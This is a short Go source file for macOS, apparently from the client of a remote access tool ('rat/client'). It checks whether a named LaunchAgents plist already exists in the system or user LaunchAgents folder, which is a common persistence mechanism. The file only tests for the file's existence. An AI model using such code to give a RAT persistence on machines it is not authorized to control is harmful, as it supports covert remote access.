//+build darwin

package startup

import (
	"os"
	"rat/client/computer"
)

func Check(name string) bool {
	var dir string

	if computer.IsRoot() {
		dir = "/Library/LaunchAgents/"
	} else {
		home := computer.GetComputerInformation().HomeDir
		dir = home + "/Library/LaunchAgents/"
	}

	_, err := os.Stat(dir + name + ".plist")

	return !os.IsNotExist(err)
}
